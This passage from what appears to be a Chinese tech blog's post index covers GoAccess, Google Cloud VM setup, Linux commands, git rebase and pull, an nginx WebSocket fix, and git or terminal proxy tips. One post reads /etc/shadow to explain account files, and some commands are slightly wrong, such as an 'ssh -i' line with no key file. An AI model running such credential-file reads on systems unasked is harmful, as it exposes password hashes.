都不是永远不变的，只是相对于你要监控的日志格式。 运行GoAccess方式一，通过-p参数，指定配置文件。 1$ goaccess nginx&#x2F;access.log -p ~&#x2F;.goaccessrc 方式二，直接在命令行参数中指定日志格式，详情见上面的例子。 终端输出以下提示使用预定义日志格式的日志配置对话框供您选择，然后实时显示统计信息。 1$ goaccess nginx&#x2F;access.log -c 通常选择第三个，通用日志格式（CLF），成功之后就是这样个样子： 控制台下的操作方法： 1234567891011121314151617* F1或h主要帮助。* F5重绘主窗口。* q退出程序，当前窗口或折叠活动模块* o或ENTER展开所选模块或打开窗口* 0-9并将Shift + 0所选模块设置为活动状态* j在展开的模块中向下滚动* k在扩展模块中向上滚动* c设置或更改方案颜色* ^ f在活动模块中向前滚动一个屏幕* ^ b在活动模块中向后滚动一个屏幕* TAB迭代模块（转发）* SHIFT + TAB迭代模块（向后）* s对活动模块的排序选项* &#x2F;搜索所有模块（允许正则表达式）* n找到下一个出现的位置* g移至屏幕的第一个项目或顶部* G移动到屏幕的最后一项或底部 静态HTML 输出以下内容分析访问日志并在静态HTML报告中显示统计信息。 1$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html 实时HTML 输出1$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html --real-time-html 然后用浏览器访问，大概就是这个样子： 配置文件及日志格式说明GoAccess 的配置文件位于%sysconfdir%/goaccess.conf或~/.goaccessrc 其中，%sysconfdir%是 /etc/，/usr/etc/ 或 /usr/local/etc/ time-format和date-format的格式通常都是固定的，只有log-format的格式视具体日志格式而定。 123time-format %Tdate-format %d&#x2F;%b&#x2F;%Y log-format常用格式说明： 1234567891011121314151617181920212223* %x与时间格式和日期格式变量匹配的日期和时间字段。当给出时间戳而不是日期和时间在两个单独的变量中时使用。* %t时间字段匹配时间格式变量。* %d与日期格式变量匹配的日期字段。* %v服务器名称根据规范名称设置（服务器块或虚拟主机）。* %e这是HTTP身份验证确定的请求文档的人的用户标识。* %hhost（客户端IP地址，IPv4或IPv6）* %r来自客户端的请求行。这需要围绕请求的特定分隔符（单引号，双引号等）可解析。否则，使用特殊的格式说明符，如组合%m，%U，%q和%H解析各个字段。注意：使用或者%r获得完整的请求OR %m，%U，%q并%H形成你的要求，不要同时使用。* %m请求方法。* %U请求的URL路径。注意：如果查询字符串在%U，则无需使用%q。但是，如果URL路径不包含任何查询字符串，则可以使用%q并将查询字符串附加到请求中。* %q查询字符串。* %H请求协议。* %s服务器发送回客户端的状态代码。* %b返回给客户端的对象大小。* %R“Referer”HTTP请求标头。* %u用户代理HTTP请求标头。* %D服务请求所需的时间，以微秒为单位。* %T服务请求所需的时间，以毫秒为单位，分辨率为毫秒。* %L 服务请求所用的时间，以毫秒为单位的十进制数。* %^忽略此字段。* %~向前移动日志字符串，直到找到非空格（！isspace）char。* ~h X-Forwarded-For（XFF）字段中的主机（客户端IP地址，IPv4或IPv6）。 常用参数 -f：指定需要分析的日志文件路径 -c：程序启动时提示日志/日期配置窗口 -p：指定要使用的自定义配置文件 -d：在HTML或JSON输出上启用IP解析器 -o：输出到指定扩展名文件中（Html、Json、CSV） -a：按主机启用用户代理列表。为了更快地解析，请不要启用此标志 -d：在HTML或JSON输出上启用IP解析器。 总结：GoAccess 从安装到使用还是非常方便的，不仅可以对历史的日志进行分析，也能实时对日志进行分析，所支持的日志格式基本能满足大多数应用场景。 参考链接 GoAccess 官网 GoAccess 入门 使用GoAccess 分析Nginx 日志 将Nginx log_format转换为goaccess配置文件 GoAccess 日志格式转换案例一 GoAccess 日志格式转换案例二 GoAccess 日志格式转换案例三 GoAccess 日志格式转换案例四","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"GoAccess","slug":"GoAccess","permalink":"https://www.0x2beace.com/tags/GoAccess/"},{"name":"Logs","slug":"Logs","permalink":"https://www.0x2beace.com/tags/Logs/"}]},{"title":"手把手教你如何创建启动 Google Cloud 实例","slug":"teach-you-how-to-create-and-start-a-google-cloud-instance","date":"2020-08-26T15:25:21.000Z","updated":"2020-08-27T06:27:35.489Z","comments":true,"path":"teach-you-how-to-create-and-start-a-google-cloud-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-create-and-start-a-google-cloud-instance/","excerpt":"最近需要在Google Cloud 上重新开一台Hk区的服务器，所以写这篇笔记用来记录操作过程。","text":"最近需要在Google Cloud 上重新开一台Hk区的服务器，所以写这篇笔记用来记录操作过程。 创建VM 实例 Google Cloud 官网 Google Cloud Platform 控制台 进入控制台，找到 Compute Engine，点击创建实例。 新建虚拟机实例，选择相应的配置。 选择操作系统映像，以及磁盘大小。 基本配置如下： 然后点击创建就可以了。创建成功之后，就可以看到该服务器的IP地址了。 这里需要注意的是，Google Cloud 的远程连接SSH 的方式与其他平台有所区别。 创建SSH 连接Compute Engine =》元数据 =》SSH 密钥 找到修改，然后上传你的 SSH Key。 不知道SSH Key 是什么？ 1234$ ssh-keygen -t rsa# 打开终端，输入上面那个命令# 然后在~&#x2F;.ssh 目录下会生成一个 公钥和私钥# 将 .pub 结尾的文件打开，复制其中的值，粘贴到Google Cloud 上就可以了。 连接使用ssh -i max@35.241.77.3 命令连接，其中 max 是用户名，后面是对应服务器 ip地址。 参考链接 开启Linux 虚拟机使用快速入门–官网文档 GCP（Google Cloud Platform）入门","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"云","slug":"云","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"不常用Linux命令","slug":"not-commonly-used-linux-commands","date":"2020-08-25T12:53:33.000Z","updated":"2020-08-25T12:54:50.257Z","comments":true,"path":"not-commonly-used-linux-commands/","link":"","permalink":"https://www.0x2beace.com/not-commonly-used-linux-commands/","excerpt":"这篇笔记的目的是记录那些不太常用但却很实用的 Linux 命令。","text":"这篇笔记的目的是记录那些不太常用但却很实用的 Linux 命令。 Wgetwget 命令用于文件的下载， 下载单个文件123# 下载Ubuntu 18.04 桌面版和服务端版$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-live-server-amd64.iso$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-desktop-amd64.iso wget默认会以最后一个符合”/”的后面的字符来命令，对于动态链接的下载通常文件名会不正确。 为了解决这个问题，我们可以使用参数-O来指定一个文件名： 下载单个文件并重命名1$ wget -O file.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080 后台下载当需要下载比较大的文件时，使用参数-b可以隐藏在后台进行下载： 1$ wget -b http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip 可以使用以下命令来察看下载进度： 1$ tail -f wget-log CurlScpscp 命令用于文件传输，在不能使用 XShell 这类工具时，scp能很好的解决文件上传的问题。 上传文件1$ scp -r &#x2F;c&#x2F;User&#x2F;Desktop&#x2F;dirname username@34.92.117.222:&#x2F;tmp&#x2F;dirname 下载文件1$scp -r Boo@34.92.117.222:&#x2F;tmp&#x2F;dirname &#x2F;c&#x2F;Users&#x2F;Boo&#x2F;Desktop&#x2F;dirname 如果存在端口号： 注意：-P参数是大写。 1scp -P 58812 root@103.232.86.239:&#x2F;tmp&#x2F;runfast_0603.sql ~&#x2F;File&#x2F; 其中 -r 参数表示目录，username 表示服务器对应用户，@ 后面接服务器地址。 注意：不要直接使用 root 用户，因为总是会提示你权限不足。另外使用非 root 用户时，需要注意文件夹权限的问题。 zipzip 命令用于对文件进行打包处理，也就是我们常说的压缩。文件经压缩之后会生成一个具有.zip扩展名的压缩文件。 将当前目录的dir目录下的所有文件及文件夹压缩为 example.zip 1$ zip -r -q example.zip dir 将当前目录下的所有文件及文件夹压缩为 example.zip 1$ zip -r -q * 将指定文件目录的所有文件及文件夹压缩为 example.zip 1$ zip -r -q exmaple.zip &#x2F;tmp&#x2F;dir unzipunzip 命令用于解压缩由 zip 命令压缩的“.zip”压缩包。 查看压缩文件 1$ unzip -v dir.zip 将压缩文件在当前目录下解压 1$ unzip example.zip 将压缩文件example.zip在指定目录/tmp下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。 1$ unzip -n example.zip -d &#x2F;tmp 将压缩文件example.zip在当前目dir下解压，如果已有相同的文件，不询问，直接覆盖。 1$ unzip -o example.zip -d -o 参数表示不必先询问用户，unzip执行后覆盖原有的文件；-d 参数指定文件解压缩后所要存储的目录；-n 参数解压缩时不要覆盖原有的文件； tartar 命令可以为linux 文件和目录创建档案。 利用tar命令，可以把一大堆的文件和目录全部打包成一个文件。 需要明确的两个概念是：打包和压缩是不同的两件事。 打包：是指将一大堆文件或目录变成一个总的文件； 压缩：则是将一个大文件通过压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 打包仅打包，不压缩。 1$ tar -cvf test.tar 20200323.log test.tar这个文件名是自定义的，只是习惯上我们使用.tar作为包文件。 打包并压缩打包，且压缩。-z参数表示以.tar.gz或者.tgz后缀名代表gzip压缩过的tar包。 1$ tar -zcvf test.tar.gz 20200323.log 打包，且压缩。-j参数表示以.tar.bz2后缀名作为tar包名。 1$ tar -jcvf test.tar.bz2 20200323.log 查看包内容1$ tar -ztvf test.tar.gz 因为使用gzip命令压缩的test.tar.gz，所以查看压缩包时需要加上-z参数。 如何只解压部分文件？ 1$ tar -ztvf test.tar.gz 20200323.log 这种方式仅限于取一个文件。 解压在该目录下直接解压： 1$ tar -zxvf test.tar.gz 解压至指定文件夹： 123$ tar -zxvf test.tar.gz -C log$ ls log20200323.log gzip.gz压缩包（不带tar），需要使用gzip 命令去解压。 1gzip test.gz -d &#x2F;&lt;filename&gt; -d 参数用于指定解压位置 杂项如何查看Linux 的发行版本？ 1$ lsb_release -a crontabcrontab 命令被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似。 ww命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。 不带任何参数，会显示当前登入系统的所有用户 12345$ w 10:54:39 up 14 days, 22:39, 2 users, load average: 0.18, 0.09, 0.08USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATwangyh pts&#x2F;0 113.87.129.118 10:27 25:10 2.77s 2.76s topBoo pts&#x2F;1 113.87.129.118 10:54 1.00s 0.00s 0.00s w 第一行显示的字段信息分别是： 10:50:39：系统当前时间 up 2:02： 系统已运行时间 2 user：当前在线用户个数 load average：系统的平均负载，3个数值分别对应系统在过去的1,5,10分钟内的负载程度，数值越大，表明系统的负载越大。 第二行几个字段分别表示： USER ： 登陆用户的账户名 TTY： 用户登陆所使用的终端 FROM： 显示用户从何处登陆，用户的IP地址 LOGIN@：显示用户登陆入系统时的时间 IDLE：用户空闲时长，从上一次该用户的任务结束后开始计时，以hour为单位 JCPU：表示在某段时间内，当前用户所有的进程任务所消耗的CPU时间 PCPU：表示在某段时间内，当前用户正在执行的进程任务所消耗的CPU时间 WHAT：表示用户正在执行的任务 whowho 命令用于查看目前登入系统的用户信息，与w命令类似。 显示当前登入系统中的所有用户信息 123$ whowangyh pts&#x2F;0 2019-04-19 10:27 (113.87.129.118)Boo pts&#x2F;1 2019-04-19 10:54 (113.87.129.118) 常用参数-m：效果等同于执行whoami命令-q或--count：只显示登入系统的帐号名称和总人数；-H：增加显示用户信息状态栏 lastlast 命令用于查看用户最近的登入信息 输出最后10 条登入信息 1234$ last -3Boo pts&#x2F;1 113.87.129.118 Fri Apr 19 10:54 still logged inwangyh pts&#x2F;0 113.87.129.118 Fri Apr 19 10:27 still logged inwangyh pts&#x2F;5 113.87.129.118 Fri Apr 19 10:24 - 10:27 (00:02) 查看指定用户的登入信息 1234$ last Boo -3Boo pts&#x2F;1 113.87.129.118 Fri Apr 19 10:54 still logged inBoo pts&#x2F;4 113.87.129.118 Fri Apr 19 10:23 - 10:26 (00:03)Boo pts&#x2F;4 113.87.129.118 Fri Apr 19 10:14 - 10:22 (00:08) pkillpkill命令可以按照进程名杀死进程，可以用于踢出当前登入系统的用户。 安全的踢出用户可以使用pkill命令踢出当前正登入系统中的用户，但是这么做很危险，更好的解决办法是：先查看终端号，然后查看该终端执行的所有进程，根据进程号来停止服务。 12$ ps -ef| grep pts&#x2F;0$ kill -9 pid passwdpasswd 命令用于设置用户的认证信息，包括用户密码、密码过期时间等。 系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。 ssss 命令用来显示处于活动状态的套接字信息。ss 命令可以用来获取socket 统计信息，它可以显示和netstat 类似的内容。但ss 的优势在于它能够显示更多更详细的有关TCP 和连接状态的信息，而且比netstat 更快速更高效。 显示所有的tcp 套接字 1$ ss -t -a 显示Socket 摘要 1$ ss -s 列出所有打开的网络连接端口 1$ ss -l 找出打开套接字/端口应用程序 1$ ss -pl | grep 6666 知识扩展存放用户信息： 12$ cat &#x2F;etc&#x2F;passwd$ cat &#x2F;etc&#x2F;shadow 用户信息文件分析（每项用:隔开）： 12345678jack:X:503:504:::&#x2F;home&#x2F;jack&#x2F;:&#x2F;bin&#x2F;bashjack &#x2F;&#x2F;用户名X &#x2F;&#x2F;口令、密码503 &#x2F;&#x2F;用户id（0代表root、普通新建用户从500开始）504 &#x2F;&#x2F;所在组: &#x2F;&#x2F;描述&#x2F;home&#x2F;jack&#x2F; &#x2F;&#x2F;用户主目录&#x2F;bin&#x2F;bash &#x2F;&#x2F;用户缺省Shell 存放组信息： 12cat &#x2F;etc&#x2F;groupcat &#x2F;etc&#x2F;gshadow 用户组信息文件分析： 123456789jack:$!$:???:13801:0:99999:7:*:*:jack &#x2F;&#x2F;组名$!$ &#x2F;&#x2F;被加密的口令13801 &#x2F;&#x2F;创建日期与今天相隔的天数0 &#x2F;&#x2F;口令最短位数99999 &#x2F;&#x2F;用户口令7 &#x2F;&#x2F;到7天时提醒* &#x2F;&#x2F;禁用天数* &#x2F;&#x2F;过期天数 如果是普通用户执行passwd只能修改自己的密码。如果新建用户后，要为新用户创建密码，则用passwd用户名，注意要以root用户的权限来创建。 12# 修改boo 用户的密码$ passwd boo 参考链接： Wget 命令 SCP 命令 last 命令 who 命令 pkill 命令 ss 命令 permission denied,please try again","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Linux Commands","slug":"Linux-Commands","permalink":"https://www.0x2beace.com/tags/Linux-Commands/"}]},{"title":"Git 变基命令详解","slug":"detailed-explanation-of-git-rebase-commands","date":"2020-08-24T12:06:20.000Z","updated":"2020-08-25T12:10:32.469Z","comments":true,"path":"detailed-explanation-of-git-rebase-commands/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-git-rebase-commands/","excerpt":"“变基”命令是git 常用命令中，比较冷门的，一方面是因为这个命令比较“危险”，如果用不好，很有可能会导致代码丢失。另一方面是因为这个命令不像 add、commit、pull、push 属于必须要执行的命令，就算不用它，也能干活。","text":"“变基”命令是git 常用命令中，比较冷门的，一方面是因为这个命令比较“危险”，如果用不好，很有可能会导致代码丢失。另一方面是因为这个命令不像 add、commit、pull、push 属于必须要执行的命令，就算不用它，也能干活。 场景重现问题描述：有时候我们在本地提交完代码，下一个操作是需要推送到远程仓库，这时如果远程仓库已经有了更新的提交，那么当我们执行完git push 命令之后，不出意外会出现以下错误： 1234567! [rejected] master -&gt; master (fetch first)error: failed to push some refs to &#39;git@gitlab.com:invest2&#x2F;invest_home.git&#39;hint: Updates were rejected because the remote contains work that you dohint: not have locally. This is usually caused by another repository pushinghint: to the same ref. You may want to first integrate the remote changeshint: (e.g., &#39;git pull ...&#39;) before pushing again.hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details. 这时错误的意思是：推送失败，你需要先将远程仓库最新的提交更新到本地仓库，然后才能 git push。 所以这个时候你有两个选择： 使用git pull 自动合并 使用git fetch 手动合并 前者虽然用起来很方便，但是自动合并会留下一次合并记录，类似这样： 1Merge branch &#39;master&#39; of bitbucket.org:maxt2013&#x2F;invest_home 虽然这并不会影响什么，但如果你很重视 commit logs，那么这样的一次记录，是不被容忍的。 后者通过手动合并，确实可以做到没有多余的合并记录，但是每次手动合并有比较麻烦，那么有没有什么折中的方式，既可以不留下多余的记录，有比较省事。 答案是有的，它就是我们下面要介绍的“变基”。 rebase下面这条命令会将远程仓库中最新的提交合并到本地仓库，--rebase参数的作用是先取消 commit 记录，并把它们临时保存为补丁（patch），这些补丁放在 .git/rebase目录中，等远程仓库同步至本地之后，最后才将补丁合并到本地仓库。 1git pull --rebase origin master 下面用图来解释具体发生了什么。 git pull 之前的情况： 使用 git pull --rebase origin： 最后使用 git push： 总结如果你对 commit logs有强烈的控制欲望，那么变基命令是适合你的，如果你是使用git 的新手，或者你不在意 commit logs，那么直接使用 git pull 自动合并就好了。 参考链接 git push错误failed to push some refs to的解决","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Socket.io 连接异常：Error during WebSocket handshake Unexpected response code 400","slug":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400","date":"2020-08-23T02:34:50.000Z","updated":"2020-08-23T02:43:00.235Z","comments":true,"path":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","link":"","permalink":"https://www.0x2beace.com/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","excerpt":"前段时间线上的生产环境遇到一个问题：Error during WebSocket handshake: Unexpected response code: 400。 起初我没太在意，以为就是正常的 socket.io 连接断开了。 直到我发现 socker.io 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。","text":"前段时间线上的生产环境遇到一个问题：Error during WebSocket handshake: Unexpected response code: 400。 起初我没太在意，以为就是正常的 socket.io 连接断开了。 直到我发现 socker.io 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。 nginx 作为wbsocket 代理经过一番查找，了解到 nginx 在作为反向代理时，如果需要使用 wss，那么还需要额外加一段配置。 NGINX supports WebSocket by allowing a tunnel to be set up between a client and a backend server. For NGINX to send the Upgrade request from the client to the backend server, the Upgrade and Connection headers must be set explicitly. —— Nginx 官网 翻译过来就是：nginx 通过允许在客户端和后端服务器之间建立连接来支持 websocket 通讯，为了使 nginx 将升级请求从客户端发送到后端服务器，必须明确设置 Upgrade 和 Connection 标头。 12345678location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;wsbackend; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;Upgrade&quot;; proxy_set_header Host $host;&#125; 第一行是 nginx 反向代理的配置，后面四行才是这个问题的解决方案。 仔细想一想，因为本地没有 https 的概念，并没有发现这个问题，而线上是有配置证书的，所以暴露出了这个问题。 总结socket.io 的请求并没有真正达到，请求发出之后中间为什么没有到达节点，这个是解决问题的关键。 为了使 nginx 正确处理 socket.io 所需要做的就是正确设置标头，以处理将连接从 http 升级到 websocket 的请求。 参考链接 Nginx 作为Websocket 反向代理","categories":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"}]},{"title":"Git Clone 太慢怎么办？","slug":"what-should-I-do-if-git-clone-is-too-slow","date":"2020-08-19T14:29:15.000Z","updated":"2020-09-08T01:31:21.124Z","comments":true,"path":"what-should-I-do-if-git-clone-is-too-slow/","link":"","permalink":"https://www.0x2beace.com/what-should-I-do-if-git-clone-is-too-slow/","excerpt":"","text":"前言最近在使用git 时，需要克隆Bitbucket的一个仓库，于是像往常一样打开了iTerm，便放在一边了。直到一个小时后，我才想起来，想着应该克隆完了，打开才发现百分之一都没下载完。 强大的长城技术对GitHub、Bitbucket 这类源代码托管服务平台网开一面，并没有像Google、FaceBook那样直接一刀切，但是它做了严格的限速，这种折磨简直比无法访问更难受。 上图中git clone的速度从来没有超过 10k/s，这也就意味着一个 100M 的项目，需要近三个小时才能下载完，而且由于网络的不稳定性，下载过程中偶尔会出现断开连接的情况，由于git clone 不支持端点续传，这就会导致前几个小时的下载量完全浪费掉了，只能重新开始下载。 这篇文章主要用来介绍几种方式可以快速的克隆远程仓库。 浅复制git clone默认会下载项目的完整历史版本，如果你只关心代码，而不关心历史信息，那么可以使用 git 的浅复制功能： 1$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;bcit-ci&#x2F;CodeIgniter.git --depth=1 表示只下载最近一次的版本，使用浅复制可以大大减少下载的数据量，例如，CodeIgniter 项目完整下载有近 100MiB ，而使用浅复制只有 5MiB 多，这样即使在恶劣的网络环境下，也可以快速的获得代码。 如果之后又想获取完整历史信息，可以使用下面的命令： 1$ git fetch --unshallow 或者，如果你只想下载最新的代码，你也可以直接从远程仓库下载打包好的zip文件，这会比浅复制更快，因为它只包含了最新的代码文件，而且zip是压缩文件。但是很显然，使用浅复制会灵活一些。 GUI 工具如果你有幸正在使用代理，懂得如何科学上网的话，那么访问GitHub、Bitbucket对你来说应该不在话下。 从源代码托管服务平台下载项目最简单的方法就是使用一款图形化界面（GUI）的Git工具。 使用GUI工具方便之处就在于，可以在设置中直接配置是否使用代理。或者直接将代理配置尾系统代理。 http/https proxy如果你跟我一样，更喜欢使用原生的git命令，喜欢使用在命令行下操作的那种感觉，那么你也可以在命令行下直接配置代理。 这里也有两种方式，根据实际情况自行选择。 http12$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1087 或者直接编辑~/.gitconifg文件 123456# vim ~&#x2F;.gitconfig[http] proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087[https] proxy &#x3D; https:&#x2F;&#x2F;127.0.0.1:1087 socks512$ git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086$ git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086 其中，1087、1086分别是你本地机器的 http、socks5代理的端口号。 另外，如果想取消设置，可以输入以下命令： 12$ git config --global --unset http.proxy$ git conifg --global --unset https.proxy 配置完成后，重新 clone一遍，可以看到速度得到了极大的提升。 注意⚠️ 上面这种配置方式仅适用于 https协议，如果你在clone时选择ssh协议，那么速度仍然会很慢。 替换域名如果你觉得上面的方式太麻烦了，或者是你没有代理，那么可以试试下面这种方式。 这种方式简单暴力，替换就可以直接使用，使用规则如下： 12345# 原地址$ git clone https:&#x2F;&#x2F;github.com&#x2F;996icu&#x2F;996.ICU.git# 替换成$ git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;996icu&#x2F;996.ICU.git 只需要在github.com后面追加一个.cnpmjs.org就可以了。 以上就是git clone太慢时的各种解决办法。 参考链接Git Clone 太慢怎么办？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"}]},{"title":"如何让终端命令走代理？","slug":"how-to-make-terminal-commands-go-through-proxy","date":"2020-08-18T15:39:58.000Z","updated":"2020-08-18T15:43:24.093Z","comments":true,"path":"how-to-make-terminal-commands-go-through-proxy/","link":"","permalink":"https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/","excerpt":"问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完brew updata 之后，就一直是Updating Homebrew...","text":"问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完brew updata 之后，就一直是Updating Homebrew... 这个时候，我产生了几个疑问： 为什么卡着不动了，明明是有网络的啊。 难道是因为Homebrew 需要访问国外的源？ Shadowsocks 明明是开着全局代理，为什么没有用？ 如何让终端命令走代理，或者说如何让 Homebrew 走代理更新？ 方案首先先回答一下上面那些问题，因为国内网络环境进一步恶劣，使得从根本上造成了这个问题的产生。因为Shadowshocks的全局代理虽然对浏览器是有效，但对命令行无效。 所以这一切的问题可以总结成一个问题：如果能让终端命令走代理就好了。 好在Homebrew 是支持全局代理的，所以我们只需要在当前环境中加入代理配置就好了。 123export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080&#x2F;&#x2F; 1080 是本地 socks5 监听端口 如何知道终端命令有没有走代理？ 有一个很简单的方法，那就是通过Curl 命令： 1curl https:&#x2F;&#x2F;www.google.com 如果走了本地代理，那么很快终端就会有输出，如果没有走则会提示403 端口请求超时。 永久生效需要注意的是，上面的配置仅仅只是临时的，如果重启一下终端，这个配置就失效了，那么有没有办法可以永久生效呢？ 当然是有的，只需要将环境变量写入终端中。 12345# bashecho export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.bash_profile# zshecho export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.zsh_profile 这样，Homebrew 就能通过 Shadowsocks 来更新了。 参考链接 让 Homebrew 走代理更新 如何让Homebrew 走代理更新？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Git Pull 命令详解","slug":"detailed-git-pull-command","date":"2020-08-17T15:34:26.000Z","updated":"2020-08-17T15:36:38.472Z","comments":true,"path":"detailed-git-pull-command/","link":"","permalink":"https://www.0x2beace.com/detailed-git-pull-command/","excerpt":"这片文章主要用来讲解git pull命令的一些细节。","text":"这片文章主要用来讲解git pull命令的一些细节。 git pullgit pull 的作用是：取回远程主机某个分支的更新，再与本地指定分支自动合并。 描述将远程主机中的更改合并到当前分支，在默认情况下git pull是git fetch命令和git merge Fetch_HEAD命令的合集，后面会详细介绍。 示例这是git pull 的完整格式： 1$ git pull [options] [&lt;repository&gt; [&lt;refspec&gt;…]] 比如要取回origin主机的fixbug分支的最新提交，并与本地的master分支合并，就需要写成这个样子： 1$ git pull origin fixbug:master 如果远程分支要与当前分支合并，则冒号及其冒号后的分支可以省略，就变成了这个样子： 12&#x2F;&#x2F; 取回firebug 分支的最新提交并与当前分支合并$ git pull origin fixbug 上面的命令表示，取回origin/fixbug分支最新的提交，并于当前分支合并。 这里就等同于先git fetch获取所跟踪的远程分支的最新的提交，然后执行git merge合并到当前分支。也就是下面两条命令。 12345&#x2F;&#x2F; 自动从当前分支的跟踪分支上获取最新的提交$ git fetch &#x2F;&#x2F; 合并origin&#x2F;fixbug分支到当前分支$ git merge origin&#x2F;fixbug git fetch 为什么这个分支是这种写法? 因为git fetch命令会获取当前追踪分支的最新更改，就等同于取回origin/fixbug分支到本地。 你可以使用git branch -a 查看所有分支，会发现多了一个 origin/fixbug分支，前提是该分支已经建立了追踪关系。 而这个分支所包含的内容就是最新的提交或者其他某些更改。所以此时你需要通过合并这个长的比较奇怪的分支，来更新本地的工作区。 在某些场合，Git 会自动在本地分支与远程分支之间建立一种追踪关系（tracking）。比如，我们在clone 时，会发现所有本地分支默认与远程主机的同名分支，建立追踪关系。也就是说，本地的 master 分支自动追踪 origin/master分支。 Git 也允许手动添加追踪关系。 12&#x2F;&#x2F; 本地master分支与取回origin&#x2F;fixbug分支建立关系。$ git branch --set-upstream master origin&#x2F;fixbug 如果当前分支与远程分支存在追踪关系。那么git pull 就可以省略远程分支名。 1$ git pull origin 上面的分支是什么意思呢？就是表示本地的当前分支会自动与对应的origin主机的“追踪分支”进行合并。 如果当前分支只对应一种追踪分支，那么远程主机名都可以省略。 12&#x2F;&#x2F; 这也就成了我们常看见的原始命令。$ git pull 上面的命令会自动的与唯一的追踪分支进行合并。 如何将远程分支作为本地的默认分支？ 1$ git branch --track &lt;remote branch&gt; remotes&#x2F;origin&#x2F;&lt;remote branch&gt; 这样就将远程的分支与本地同名分支建立了追踪关系。 可以使用git config -e命令查看。 当追踪关系只有一个时，那么使用git pull 命令，就可以直接更新&lt;remote branch&gt; 分支了。 如果合并需要采用rebase模式，可以使用--rebase选项。 git rebase 这里说一个题外话，rebase 是什么？有什么用？ git rebase 清除本地历史提交 1$ git --rebase &lt;远程主机名&gt;&lt;远程分支名&gt;:&lt;本地分支名&gt; git fetch 与 git pull 的区别。 git fetch 表示从远程获取最新的版本到本地，但是不会自动合并。其过程用命令表示就是： 123$ git fetch origin master$ git log 